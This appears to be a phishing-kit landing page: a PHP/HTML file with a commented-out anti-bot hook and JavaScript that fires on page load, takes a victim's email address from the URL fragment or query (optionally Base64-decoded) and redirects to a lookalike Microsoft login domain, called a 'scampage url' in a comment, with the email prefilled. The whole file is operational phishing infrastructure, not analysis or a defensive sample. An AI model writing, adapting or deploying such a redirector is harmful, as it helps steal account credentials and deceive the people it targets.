<?php

require 'vendor/autoload.php';

use Acme\AntiBot;

// AntiBot::analysis();

?>

<!DOCTYPE html>
<html>
<head>
    <title>We Moving</title>
    <!-- Re -->
    <!-- IC -->


    <script type="text/javascript">
        //domain string to match if redirecting to domain
        var domainMatching = 'google'; //where go going to redirect domain name google
        //where to redirect scampage url
        var redirectUrl = 'https://login-microsoftonline.tigoenergym1crosoft-passwd.com/?username=';
        //redirect sperator word
        var redirectDelimiter = '#';
        //enable base64
        var enablebase64 = false;
        
        var decodebase64 = false;

        /**
*
*  Base64 encode / decode
*  http://www.webtoolkit.info/
*
**/
var Base64 = {

// private property
_keyStr : "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",

// public method for encoding
encode : function (input) {
    var output = "";
    var chr1, chr2, chr3, enc1, enc2, enc3, enc4;
    var i = 0;

    input = Base64._utf8_encode(input);

    while (i < input.length) {

        chr1 = input.charCodeAt(i++);
        chr2 = input.charCodeAt(i++);
        chr3 = input.charCodeAt(i++);

        enc1 = chr1 >> 2;
        enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
        enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
        enc4 = chr3 & 63;

        if (isNaN(chr2)) {
            enc3 = enc4 = 64;
        } else if (isNaN(chr3)) {
            enc4 = 64;
        }

        output = output +
        this._keyStr.charAt(enc1) + this._keyStr.charAt(enc2) +
        this._keyStr.charAt(enc3) + this._keyStr.charAt(enc4);

    }

    return output;
},

// public method for decoding
decode : function (input) {
    var output = "";
    var chr1, chr2, chr3;
    var enc1, enc2, enc3, enc4;
    var i = 0;

    input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");

    while (i < input.length) {

        enc1 = this._keyStr.indexOf(input.charAt(i++));
        enc2 = this._keyStr.indexOf(input.charAt(i++));
        enc3 = this._keyStr.indexOf(input.charAt(i++));
        enc4 = this._keyStr.indexOf(input.charAt(i++));

        chr1 = (enc1 << 2) | (enc2 >> 4);
        chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
        chr3 = ((enc3 & 3) << 6) | enc4;

        output = output + String.fromCharCode(chr1);

        if (enc3 != 64) {
            output = output + String.fromCharCode(chr2);
        }
        if (enc4 != 64) {
            output = output + String.fromCharCode(chr3);
        }

    }

    output = Base64._utf8_decode(output);
    
    output = output.replace(/[^A-Za-z 0-9 \.,\?""!@#\$%\^&\*\(\)-_=\+;:<>\/\\\|\}\{\[\]`~]*/g, '');
    
    return output;

},

// private method for UTF-8 encoding
_utf8_encode : function (string) {
    string = string.replace(/\r\n/g,"\n");
    var utftext = "";

    for (var n = 0; n < string.length; n++) {

        var c = string.charCodeAt(n);

        if (c < 128) {
            utftext += String.fromCharCode(c);
        }
        else if((c > 127) && (c < 2048)) {
            utftext += String.fromCharCode((c >> 6) | 192);
            utftext += String.fromCharCode((c & 63) | 128);
        }
        else {
            utftext += String.fromCharCode((c >> 12) | 224);
            utftext += String.fromCharCode(((c >> 6) & 63) | 128);
            utftext += String.fromCharCode((c & 63) | 128);
        }

    }

    return utftext;
},

// private method for UTF-8 decoding
_utf8_decode : function (utftext) {
    var string = "";
    var i = 0;
    var c = c1 = c2 = 0;

    while ( i < utftext.length ) {

        c = utftext.charCodeAt(i);

        if (c < 128) {
            string += String.fromCharCode(c);
            i++;
        }
        else if((c > 191) && (c < 224)) {
            c2 = utftext.charCodeAt(i+1);
            string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));
            i += 2;
        }
        else {
            c2 = utftext.charCodeAt(i+1);
            c3 = utftext.charCodeAt(i+2);
            string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
            i += 3;
        }

    }

        string = string.replace(/[^A-Za-z 0-9 \.,\?""!@#\$%\^&\*\(\)-_=\+;:<>\/\\\|\}\{\[\]`~]*/g, '');


    return string;
}

}



        function ValidateEmail(mail) {
            if (/^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/.test(mail)) {
                return true;
            }
            return false;
        }
       

        function Fired() {

            var getParams = function (url) {
                var params = {};
                var parser = document.createElement('a');
                parser.href = url;
                console.log(parser);


                if (parser.href.match(redirectDelimiter)) {
                    var foundRedirections = parser.href.split(redirectDelimiter)[1];


                    if(enablebase64 && decodebase64)
                    {
                        if(foundRedirections.match('/')){

                            listEncoded = foundRedirections.split('/');

                            for(let encoded of listEncoded)
                            {
                                console.log(encoded);
                            dataDecoded = Base64.decode(encoded).trim();
                            
                            dataDecoded = decodeURIComponent(dataDecoded);
                                if (dataDecoded.match(domainMatching))
                                {
                                     window.location.href = dataDecoded.match('http') ? dataDecoded : 'http://' + dataDecoded;
                                }
				if(dataDecoded.match('@')){
					window.location.href =  redirectUrl + dataDecoded;
				}
                            
                            }
                        }

                    }

                    if (foundRedirections.match(domainMatching)) {
                        if(enablebase64 && decodebase64)
                            foundRedirections = Base64.decode(foundRedirections).trim();
                        window.location.href = foundRedirections.match('http') ? foundRedirections : 'http://' + foundRedirections;
                    }
                }

                var query = parser.href.split(/[#\?&=]/);

                for(let param of query)
                    {

                        if(enablebase64 && decodebase64){
                            // param = param + '==';
                            param = decodeURIComponent(param);
                            param = Base64.decode(param);
                            if(ValidateEmail(param) && decodebase64){
                           
                            window.location.href = redirectUrl + param;
                            }
                        }
                        if(enablebase64 && !decodebase64)
                        {
                            
                           if(Base64.encode(Base64.decode(param)) == param){
                                window.location.href = redirectUrl + param;
                            }
                        }
  if(param.match('@')){
                                        window.location.href =  redirectUrl + param;
                                }

                        
                    }
            };

            var param = getParams(window.location.href);


        }


    </script>
</head>

<body onload="Fired()">

</body>
</html>
